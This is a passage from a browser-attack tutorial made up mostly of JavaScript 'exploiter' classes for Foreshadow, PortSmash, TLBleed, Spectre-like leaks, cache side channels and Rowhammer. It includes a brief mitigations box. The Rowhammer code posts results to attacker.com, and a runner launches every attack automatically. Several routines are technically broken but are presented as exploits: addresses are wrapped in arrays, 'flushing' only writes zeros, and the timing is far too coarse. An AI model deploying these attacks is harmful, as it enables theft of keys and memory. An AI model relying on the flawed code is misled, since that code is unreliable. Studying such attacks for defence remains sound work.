    this.l1ProbeArray = new Uint8Array(256 * 64); // L1 cache line size
  }
  
  // Force page table entry to be terminal (present=0)
  createTerminalFault(virtualAddr) {
    // In native code, would modify page table entry:
    // PTE.present = 0
    // PTE.physicalAddr = targetSGXMemory
    
    console.log('[+] Creating terminal fault condition');
    console.log('[!] Requires kernel access or page table manipulation');
  }
  
  // Access terminal page to trigger L1TF
  triggerL1TerminalFault(faultAddr) {
    try {
      // Access causes page fault, but L1 cache loaded speculatively
      const view = new Uint8Array(faultAddr);
      const value = view[0];
      
      // Use value to access probe array
      const probeIndex = value * 64;
      this.l1ProbeArray[probeIndex] = 1;
      
    } catch (e) {
      // Page fault caught, but L1 cache side effect remains
      console.log('[+] Terminal fault triggered');
    }
  }
  
  // Probe L1 cache
  probeL1Cache() {
    const timings = [];
    
    for (let i = 0; i < 256; i++) {
      const start = performance.now();
      const value = this.l1ProbeArray[i * 64];
      const end = performance.now();
      
      timings.push({ byte: i, time: end - start });
    }
    
    timings.sort((a, b) => a.time - b.time);
    return timings[0].byte;
  }
  
  async attack(sgxMemoryAddr) {
    console.log('[+] Foreshadow/L1TF attack (conceptual)');
    console.log('[!] Targets SGX enclave memory via L1 cache');
    
    this.createTerminalFault(sgxMemoryAddr);
    this.triggerL1TerminalFault(sgxMemoryAddr);
    
    const leakedByte = this.probeL1Cache();
    console.log(`[+] Leaked SGX byte: 0x${leakedByte.toString(16)}`);
    
    return leakedByte;
  }
}
```

#### PortSmash (CVE-2018-5407): SMT/HyperThreading Exploitation

**Attack Principle**: Exploit Simultaneous Multithreading (SMT) execution port contention to leak cryptographic keys across sibling cores.

```javascript [PortSmash: SMT Port Contention]
class PortSmashExploiter {
  constructor() {
    this.measurements = [];
    this.workerCode = `
      // Run on sibling hyperthread
      self.onmessage = function(e) {
        const iterations = e.data.iterations;
        const operation = e.data.operation;
        
        const start = performance.now();
        
        // Saturate specific execution port
        if (operation === 'multiply') {
          let result = 1;
          for (let i = 0; i < iterations; i++) {
            result *= i; // Port 0/1 on Intel (multiplication)
          }
          self.postMessage({ result, time: performance.now() - start });
        }
        else if (operation === 'divide') {
          let result = 1;
          for (let i = 1; i < iterations; i++) {
            result /= i; // Port 0 only (division)
          }
          self.postMessage({ result, time: performance.now() - start });
        }
      };
    `;
  }
  
  // Create worker on sibling hyperthread
  createSiblingWorker() {
    const blob = new Blob([this.workerCode], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    return worker;
  }
  
  // Victim code performing cryptographic operation
  async victimCryptoOperation(secretKey) {
    // Simulate RSA exponentiation (key-dependent execution)
    let result = 1;
    
    for (let i = 0; i < secretKey.length; i++) {
      const bit = secretKey[i];
      
      if (bit === 1) {
        // Square and multiply (uses multiply port)
        result = result * result * 13;
      } else {
        // Square only (less port contention)
        result = result * result;
      }
    }
    
    return result;
  }
  
  // Attacker on sibling thread measures port contention
  async measurePortContention(operation, iterations) {
    return new Promise((resolve) => {
      const worker = this.createSiblingWorker();
      
      worker.onmessage = (e) => {
        resolve(e.data.time);
        worker.terminate();
      };
      
      worker.postMessage({ operation, iterations });
    });
  }
  
  async attack(secretKeyLength = 32) {
    console.log('[+] PortSmash attack (SMT port contention)');
    
    // Generate victim's secret key (to be leaked)
    const secretKey = Array.from({ length: secretKeyLength }, 
      () => Math.random() > 0.5 ? 1 : 0
    );
    
    console.log('[+] Victim secret key:', secretKey.join(''));
    
    const leakedKey = [];
    
    for (let i = 0; i < secretKeyLength; i++) {
      // Run victim crypto operation
      const victimPromise = this.victimCryptoOperation(secretKey.slice(0, i + 1));
      
      // Simultaneously measure port contention on sibling thread
      const contentionTime = await this.measurePortContention('multiply', 1000000);
      
      await victimPromise;
      
      // High contention = victim used multiply port = bit was 1
      // Low contention = victim only squared = bit was 0
      const threshold = 50; // Milliseconds (needs calibration)
      const leakedBit = contentionTime > threshold ? 1 : 0;
      
      leakedKey.push(leakedBit);
      
      this.measurements.push({
        bitIndex: i,
        actualBit: secretKey[i],
        leakedBit: leakedBit,
        contentionTime: contentionTime,
        correct: secretKey[i] === leakedBit
      });
    }
    
    const accuracy = this.measurements.filter(m => m.correct).length / secretKeyLength;
    
    console.log('[+] Leaked key:', leakedKey.join(''));
    console.log(`[+] Accuracy: ${(accuracy * 100).toFixed(1)}%`);
    console.log('[+] Measurements:', this.measurements);
    
    return {
      originalKey: secretKey,
      leakedKey: leakedKey,
      accuracy: accuracy,
      measurements: this.measurements
    };
  }
}
```

#### TLBleed: Page Table Entry Timing

**Attack Principle**: Exploit Translation Lookaside Buffer (TLB) timing to leak secrets across hyperthreads.

```javascript [TLBleed: TLB Timing Attack]
class TLBleedExploiter {
  constructor() {
    this.tlbEntries = 64; // Typical L1 TLB size
    this.pageSize = 4096;
    this.probePages = [];
  }
  
  // Allocate pages to fill TLB
  allocateProbePages() {
    // Create array of page-aligned buffers
    for (let i = 0; i < this.tlbEntries * 2; i++) {
      const buffer = new ArrayBuffer(this.pageSize);
      this.probePages.push(new Uint8Array(buffer));
    }
    
    console.log(`[+] Allocated ${this.probePages.length} probe pages`);
  }
  
  // Prime TLB with known pages
  primeTLB() {
    for (let i = 0; i < this.tlbEntries; i++) {
      this.probePages[i][0] = 1; // Access to load into TLB
    }
  }
  
  // Victim accesses secret-dependent pages
  victimAccess(secretBit) {
    const pageIndex = secretBit === 1 ? 100 : 101;
    
    if (this.probePages[pageIndex]) {
      this.probePages[pageIndex][0] = 1; // TLB entry loaded
    }
  }
  
  // Probe TLB by timing page accesses
  probeTLB() {
    const timings = [];
    
    for (let i = 0; i < this.tlbEntries * 2; i++) {
      const start = performance.now();
      
      // Access page (fast if in TLB, slow if TLB miss)
      if (this.probePages[i]) {
        this.probePages[i][0] = 1;
      }
      
      const end = performance.now();
      timings.push({ page: i, time: end - start });
    }
    
    return timings;
  }
  
  async attack(secretBits) {
    console.log('[+] TLBleed attack (TLB timing)');
    
    this.allocateProbePages();
    
    const leakedBits = [];
    
    for (const secretBit of secretBits) {
      // Prime TLB
      this.primeTLB();
      
      // Victim accesses secret-dependent page
      this.victimAccess(secretBit);
      
      // Probe TLB
      const timings = this.probeTLB();
      
      // Find which pages were accessed (fast timing = TLB hit)
      timings.sort((a, b) => a.time - b.time);
      
      // Page 100 or 101 will be fast if accessed
      const fastPage = timings.filter(t => t.page === 100 || t.page === 101)[0];
      const leakedBit = fastPage?.page === 100 ? 1 : 0;
      
      leakedBits.push(leakedBit);
    }
    
    console.log('[+] Original bits:', secretBits.join(''));
    console.log('[+] Leaked bits:  ', leakedBits.join(''));
    
    const accuracy = secretBits.filter((b, i) => b === leakedBits[i]).length / secretBits.length;
    console.log(`[+] Accuracy: ${(accuracy * 100).toFixed(1)}%`);
    
    return { originalBits: secretBits, leakedBits, accuracy };
  }
}
```

::: warning Mitigations and Defenses

**CPU Microcode Updates:**
- Intel/AMD released microcode patches for Spectre/Meltdown
- IBRS (Indirect Branch Restricted Speculation)
- STIBP (Single Thread Indirect Branch Predictors)
- SSBD (Speculative Store Bypass Disable)

**Browser Mitigations:**
- **SharedArrayBuffer disabled** by default (breaks high-resolution timing)
- **Site Isolation**: Each site in separate process (Chrome)
- **performance.now() clamping**: Reduced to 100Î¼s resolution with jitter
- **Cross-Origin Read Blocking (CORB)**: Prevents cross-origin memory disclosure

**Operating System:**
- **KPTI (Kernel Page Table Isolation)**: Separate kernel/user page tables (Meltdown mitigation)
- **Retpoline**: Indirect branch speculation barrier (Spectre-v2)
- **IBPB (Indirect Branch Prediction Barrier)**: Flush branch predictor on context switch

**Hardware:**
- **Newer CPUs**: Intel 10th gen+, AMD Zen 2+ have hardware mitigations
- **Disable SMT/HyperThreading**: Eliminates cross-thread attacks (PortSmash, TLBleed)

**Detection:**
- Monitor for abnormal cache timing patterns
- Detect repeated memory access patterns
- Alert on SharedArrayBuffer usage
- Track performance.now() query frequency
:::

#### Browser-Based Speculative Execution Exploitation

```javascript [Complete Speculative Attack Framework]
// Note: These are conceptual implementations - actual Spectre attacks
// require precise timing and are highly dependent on CPU microarchitecture

class SpeculativeExploiter {
  constructor() {
    this.cache = new Map();
    this.probeArray = new Array(256).fill(0);
    this.secretData = null;
  }
  
  // Flush cache line
  flushCacheLine(address) {
    // Use shared memory or large arrays to flush cache
    const view = new Uint8Array(this.probeArray.buffer);
    view[address % view.length] = 0;
  }
  
  // Time memory access
  timeMemoryAccess(address) {
    const start = performance.now();
    const value = this.probeArray[address % this.probeArray.length];
    const end = performance.now();
    
    // Prevent optimization
    if (value === 999999) {
      console.log('Unreachable');
    }
    
    return end - start;
  }
  
  // Spectre-like attack (conceptual)
  async spectreLikeAttack() {
    console.log('[+] Attempting Spectre-like attack');
    
    // Setup victim data (in different context/process)
    this.secretData = new Array(256);
    for (let i = 0; i < 256; i++) {
      this.secretData[i] = i;
    }
    
    // Train branch predictor (if bounds checking exists)
    for (let i = 0; i < 100; i++) {
      this.trainBranch(i % 10); // Stay in bounds
    }
    
    // Out-of-bounds access attempt
    const leakedByte = await this.leakByte(10); // Try to access secretData[10]
    
    console.log(`[+] Leaked byte: ${leakedByte}`);
    return leakedByte;
  }
  
  trainBranch(index) {
    // Simulate bounds checking
    if (index < 10) { // Train with in-bounds access
      const value = this.secretData[index];
      this.probeArray[value] = 1; // Access probe array
    }
  }
  
  async leakByte(secretIndex) {
    // Flush probe array
    for (let i = 0; i < 256; i++) {
      this.flushCacheLine(i);
    }
    
    // Speculative execution (this would happen in CPU)
    // In reality, this requires precise assembly or WASM
    const speculativeAccess = () => {
      const index = secretIndex; // This becomes the secret value during speculation
      if (index < this.secretData.length) {
        const value = this.secretData[index]; // Speculative load
        this.probeArray[value] = 1; // Cache this line
      }
    };
    
    // Execute speculative code
    speculativeAccess();
    
    // Probe cache to find which line was accessed
    let minTime = Infinity;
    let leakedValue = -1;
    
    for (let i = 0; i < 256; i++) {
      const time = this.timeMemoryAccess(i);
      
      if (time < minTime) {
        minTime = time;
        leakedValue = i;
      }
    }
    
    return leakedValue;
  }
  
  // Cache side-channel attack
  async cacheSideChannel() {
    console.log('[+] Running cache side-channel attack');
    
    // Setup two probe arrays in different cache sets
    const probe1 = new Array(4096).fill(0); // 4KB alignment
    const probe2 = new Array(4096).fill(0);
    
    // Prime cache
    this.primeCache(probe1, probe2);
    
    // Victim access (simulated)
    await this.simulateVictimAccess();
    
    // Probe cache
    const accessPattern = this.probeCache(probe1, probe2);
    
    console.log('[+] Cache access pattern:', accessPattern);
    return accessPattern;
  }
  
  primeCache(probe1, probe2) {
    // Access both arrays to load them into cache
    for (let i = 0; i < probe1.length; i += 64) { // Cache line size
      probe1[i] = 1;
      probe2[i] = 1;
    }
  }
  
  async simulateVictimAccess() {
    // Simulate victim accessing one of the arrays
    // In reality, this would be in a different process/context
    const victimChoice = Math.random() > 0.5 ? 'probe1' : 'probe2';
    
    if (victimChoice === 'probe1') {
      this.probeArray[0] = 1; // Access probe1
    } else {
      // Access probe2 (different cache set)
      const temp = new Array(4096).fill(0);
      temp[0] = 1;
    }
    
    // Small delay
    await new Promise(resolve => setTimeout(resolve, 10));
  }
  
  probeCache(probe1, probe2) {
    const results = {
      probe1: [],
      probe2: []
    };
    
    // Time access to each cache line
    for (let i = 0; i < probe1.length; i += 64) {
      const time1 = this.timeMemoryAccess(i);
      const time2 = this.timeMemoryAccess(i);
      
      results.probe1.push(time1);
      results.probe2.push(time2);
    }
    
    return results;
  }
  
  // Rowhammer.js - Browser-based Rowhammer
  async rowhammerAttack() {
    console.log('[+] Attempting browser-based Rowhammer');
    
    // Allocate large arrays (representing DRAM rows)
    const rows = [];
    for (let i = 0; i < 100; i++) {
      rows.push(new Uint8Array(4096)); // 4KB row
    }
    
    // Hammer adjacent rows
    const victimRow = 50;
    const aggressorRow1 = victimRow - 1;
    const aggressorRow2 = victimRow + 1;
    
    console.log(`[+] Hammering rows ${aggressorRow1} and ${aggressorRow2} to flip bits in row ${victimRow}`);
    
    // Continuous hammering
    for (let i = 0; i < 1000000; i++) {
      // Access aggressor rows rapidly
      rows[aggressorRow1][0] = i % 256;
      rows[aggressorRow2][0] = (i + 1) % 256;
      
      // Check for bit flips in victim row
      if (i % 10000 === 0) {
        const flips = this.checkBitFlips(rows[victimRow]);
        if (flips.length > 0) {
          console.log(`[+] Bit flips detected: ${flips.join(', ')}`);
          
          // Exfiltrate bit flip information
          fetch('https://attacker.com/bit-flips', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              victimRow,
              bitFlips: flips,
              hammerCount: i
            })
          });
        }
      }
    }
  }
  
  checkBitFlips(array) {
    const flips = [];
    
    for (let i = 0; i < array.length; i++) {
      if (array[i] !== 0) { // Assuming initialized to 0
        flips.push(`offset_${i}: ${array[i]}`);
      }
    }
    
    return flips;
  }
  
  // Microarchitectural timing attack
  async microarchitecturalTiming() {
    console.log('[+] Running microarchitectural timing attack');
    
    const operations = [
      () => Math.sqrt(Math.random()), // ALU operation
      () => new Array(1000).fill(0), // Memory allocation
      () => JSON.parse('{"data": "test"}'), // JSON parsing
      () => crypto.getRandomValues(new Uint8Array(32)) // Crypto operation
    ];
    
    const timingResults = {};
    
    for (let i = 0; i < operations.length; i++) {
      const op = operations[i];
      const measurements = [];
      
      for (let j = 0; j < 1000; j++) {
        const start = performance.now();
        op();
        const end = performance.now();
        measurements.push(end - start);
      }
      
      timingResults[`operation_${i}`] = {
        average: measurements.reduce((a, b) => a + b, 0) / measurements.length,
        min: Math.min(...measurements),
        max: Math.max(...measurements),
        variance: this.calculateVariance(measurements)
      };
    }
    
    console.log('[+] Microarchitectural timing results:', timingResults);
    
    // Use timing differences to fingerprint CPU
    const fingerprint = this.fingerprintFromTiming(timingResults);
    console.log('[+] CPU fingerprint:', fingerprint);
    
    return timingResults;
  }
  
  calculateVariance(values) {
    const mean = values.reduce((a, b) => a + b, 0) / values.length;
    const squareDiffs = values.map(value => Math.pow(value - mean, 2));
    return squareDiffs.reduce((a, b) => a + b, 0) / squareDiffs.length;
  }
  
  fingerprintFromTiming(timingResults) {
    // Create fingerprint based on timing characteristics
    const fingerprint = {};
    
    Object.entries(timingResults).forEach(([op, stats]) => {
      fingerprint[op] = {
        performance: stats.average < 1 ? 'high' : 'low',
        consistency: stats.variance < 0.01 ? 'high' : 'low'
      };
    });
    
    return fingerprint;
  }
}

// Initialize speculative exploiter
const speculativeExploiter = new SpeculativeExploiter();

// Run speculative attacks
async function runSpeculativeAttacks() {
  await speculativeExploiter.spectreLikeAttack();
  await speculativeExploiter.cacheSideChannel();
  await speculativeExploiter.rowhammerAttack();
  await speculativeExploiter.microarchitecturalTiming();
}

runSpeculativeAttacks();
```

---

## Conclusion

This comprehensive deep dive has explored the full spectrum of browser-based attack vectors, from fundamental architecture exploitation to cutting-edge speculative execution attacks. The hostile DOM represents one of the most challenging attack surfaces in modern computing, combining the ubiquity of web browsers with the complexity of client-side execution environments.

**Key Takeaways:**
- Browser architecture provides rich attack surfaces through instrumentation APIs
- Visual deception attacks exploit human perception and UI trust
- Persistence mechanisms enable long-term compromise
- Code injection remains the most direct path to total control
- Credential theft bypasses traditional HttpOnly protections
- Extension exploitation extends attack reach to privileged contexts
- Fingerprinting enables both tracking and attack customization
- Advanced techniques like XS-Leaks and prototype pollution push exploitation boundaries

**Future Trends:**
- WebAssembly exploitation will grow as adoption increases
- Speculative execution attacks will become more sophisticated
- AI/ML integration will enable more intelligent attack automation
- Cross-platform consistency will improve attack reliability
- Privacy-focused changes may inadvertently create new attack vectors

The defensive landscape must evolve alongside these attacks, requiring comprehensive understanding of both offensive techniques and defensive countermeasures.

